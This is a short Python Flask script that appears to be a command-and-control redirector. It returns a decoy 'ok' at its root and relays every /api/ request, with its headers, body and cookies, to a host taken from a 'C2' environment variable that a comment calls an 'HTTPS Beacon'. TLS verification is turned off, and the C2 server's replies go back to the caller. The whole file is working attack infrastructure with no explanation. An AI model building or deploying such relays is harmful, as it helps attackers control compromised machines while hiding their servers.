from flask import Flask, request
import requests
import os

app = Flask(__name__)

@app.route('/', methods=['POST','GET'])
def example():
    return 'ok'

@app.route('/api/<path:path>', methods=['POST','GET'])
def main_handler(path):
    C2 = 'https://' + os.getenv('C2') # HTTPS Beacon

    headers = {}
    for key, value in request.headers.items():
        if key not in ['Host', 'Content-Length']:
            headers[key] = value

    try:
        req = requests.request(
            method = request.method,
            url = C2 + '/api/' +path,
            headers = headers,
            data = request.get_data(),
            cookies = request.cookies,
            verify=False,
            allow_redirects=False
            )

        rsp_headers = {}
        for key, value in req.headers.items():
            if key not in ['Date', 'Connection', 'Server']:
                rsp_headers[key] = value

        return req.text, req.status_code, rsp_headers.items()
    except:
        return 'request err'
